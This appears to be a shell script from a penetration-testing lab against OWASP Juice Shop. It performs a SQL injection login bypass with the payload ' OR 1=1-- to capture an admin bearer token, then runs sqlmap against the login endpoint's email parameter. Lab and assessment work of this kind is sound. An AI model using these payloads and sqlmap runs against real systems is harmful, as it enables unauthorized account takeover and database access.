#!/usr/bin/env bash
# ---------------------------------------------------------------------------
# scripts/03_sqli.sh — Phase 4: SQL injection (auth bypass + sqlmap)
#
# 1. Scripted HTTP request demonstrating the classic Juice Shop login
#    auth-bypass: email = "' OR 1=1--" short-circuits the SQL WHERE
#    clause and logs in as the first user in the DB (admin).
# 2. sqlmap against the same login endpoint's JSON "email" parameter to
#    confirm boolean-based blind SQLi on the SQLite backend.
# ---------------------------------------------------------------------------
source "$(dirname "${BASH_SOURCE[0]}")/lib.sh"

require curl "apt install curl / brew install curl"
require jq "apt install jq / brew install jq"
require sqlmap "apt install sqlmap / pip install sqlmap / https://sqlmap.org"

OUT_DIR="${VAPT_ROOT}/${RESULTS_DIR}/sqli"
mkdir -p "$OUT_DIR"

# --- 1. Scripted auth-bypass PoC -------------------------------------------
log "Demonstrating login auth-bypass with email = \"${SQLI_BYPASS_EMAIL}\" ..."
if token="$(login_and_capture_token)"; then
  ok "Auth bypass succeeded — bearer token captured (saved to results/jwt/token.txt)."
  jq '.' "${OUT_DIR}/auth_bypass_response.json" > "${OUT_DIR}/auth_bypass_response.pretty.json"
else
  err "Auth bypass request failed — is the target up? (run 'make setup' first)"
fi

# --- 2. sqlmap confirmation --------------------------------------------------
log "Running sqlmap against the 'email' parameter of ${LOGIN_ENDPOINT} ..."
log "(boolean-based blind SQLi against the underlying SQLite DB)"

SQLMAP_LOG="${OUT_DIR}/sqlmap_output.txt"

sqlmap \
  -u "${LOGIN_ENDPOINT}" \
  --data='{"email":"test@test.com","password":"test"}' \
  -H "Content-Type: application/json" \
  -p email \
  --batch \
  --level=3 \
  --risk=2 \
  --technique=B \
  --dbms=sqlite \
  --output-dir="${OUT_DIR}/sqlmap_session" \
  2>&1 | tee "$SQLMAP_LOG" | tee "$(logfile 03_sqli)"

ok "sqlmap output saved to ${SQLMAP_LOG} (full session under ${OUT_DIR}/sqlmap_session/)"
